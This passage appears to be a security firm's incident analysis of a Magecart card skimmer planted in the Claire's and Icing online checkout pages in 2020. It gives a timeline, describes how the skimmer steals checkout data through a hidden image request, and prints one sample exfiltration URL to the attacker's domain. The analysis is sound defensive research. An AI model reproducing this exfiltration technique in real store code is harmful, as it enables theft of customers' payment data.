class="leading-relaxed text-gray-600 [&_a]:text-ss-teal hover:[&_a]:text-ss-teal-hover text-xl"><p>A day after Claire's (fashion retailer) closed its 3,000 stores, an anonymous party registered <a Following common <a href="/what-is-magecart">Magecart</a> malpractice, payment skimmers were injected and used to steal customer data and cards.</p><h2 id="timeline" tabindex="-1">Timeline</h2><p>Claire's, a fashion retailer, closed all of its 3000 brick &amp; mortar stores worldwide on <a href="https://www.claires.com/product-and-safety.html">March 20th</a>. The next day, the domain <code>claires-assets.com</code> was registered by an anonymous party:</p><pre><code class="hljs">   Domain Name: CLAIRES-ASSETS.COM
   Registrar URL: http://www.namecheap.com
   Creation Date: 2020-03-21T21:26:17Z
   Registrant Name: WhoisGuard Protected
</code></pre><p>For the next 4 weeks, Sansec did not observe suspicious activity. But in the last week of April, malicious code was added to the online stores of <a href="https://www.claires.com">Claire's</a> and its sister brand <a href="https://www.icing.com">Icing</a>. The injected code would intercept any customer information that was entered during checkout, and send it to the <code>claires-assets.com</code> server. The malware was present until June 13th.</p><h2 id="analysis-of-the-__preloader-skimmer" tabindex="-1">Analysis of the __preloader skimmer</h2><p>The malware was added to the (otherwise legitimate) <code>app.min.js</code> file. This file is hosted on the store servers, so there is no &quot;Supply Chain Attack&quot; involved, and attackers have actually gained write access to the store code. Here is the heavily obfuscated copy:</p><p></p><div class="markdown-img"><img src="/assets/posts/cache/0f20717c758bb2b9e6f189ac787167b7.png" alt="Obfuscated __preloader skimmer code"></div><p></p><p>Decoding this reveals the following malware:</p><p></p><div class="markdown-img"><img src="/assets/posts/cache/267f7c93b1e775dfa8d5993c2a00f9c6.png" alt="Decoded skimmer"></div><p></p><p>The skimmer attaches to the submit button of the checkout form. Upon clicking, the full &quot;Demandware Checkout Form&quot; is grabbed, serialized and base64 encoded. A temporary image is added to the DOM with the <code>__preloader</code> identifier. The image is located on the server as controlled by the attacker. Because all of the customer submitted data is appended to the image address, the attacker now has received the full payload. Immediately, the image element is removed.</p><p>We suspect that attackers have deliberately chosen an image file for exfiltration, because image requests are not always monitored by security systems.</p><p>A sample exfiltration request, containing the base64 encoded customer payment data, looks like this:</p><pre><code class="hljs">https://claires-assets.com/on/demandware.static/-/Library-Sites-claires-library/default/dw2560e81d/images/claires-logo-desktop.svg?pid=42243&amp;dpath=2444.442334&amp;cid=1&amp;lid=2&amp;_v=TeJobPVJqejblUk0Svys12UIjo7QCP&amp;z=I4L7WODr9GAFyZeXpCWo6ShI8rvj2Q&amp;collect=22102
</code></pre><h2 id="comments" tabindex="-1">Comments</h2><p>The timeline may indicate that attackers anticipated a surge in online traffic following the lockdown. The period between exfil domain registration and actual malware suggests that it took the attackers a good 4 weeks to gain access to the store.</p><p>The actual root cause is as of yet unknown. Possible causes are leaked admin credentials, spearphishing of staff members and/or a compromised internal network.</p><h2 id="magecart-%26-salesforce-commerce-cloud" tabindex="-1">Magecart &amp; Salesforce Commerce Cloud</h2><p>The affected stores are hosted on the Salesforce Commerce Cloud, previously known as Demandware. This is a hosted eCommerce platform that serves some of the biggest stores globally. While the actual root cause is yet unknown, it is unlikely that the Salesforce platform got breached or that Salesforce is responsible for this incident.</p><p>Sansec monitors all global eCommerce platforms for security incidents. Previously compromised stores that use the Salesforce platform are UK outlet <a href="https://www.bleepingcomputer.com/news/security/uk-retailer-sweaty-betty-hacked-to-steal-customer-payment-info/">Sweaty Betty</a> in November and <a href="https://www.classaction.org/news/hanna-andersson-salesforce.com-failed-to-adequately-protect-consumer-information-disclose-data-breach-suit-says">Hanna Andersson</a> in September.</p><h2 id="claire's-response" tabindex="-1">Claire's response</h2><p>After we notified them, Claire's management has quickly responded.
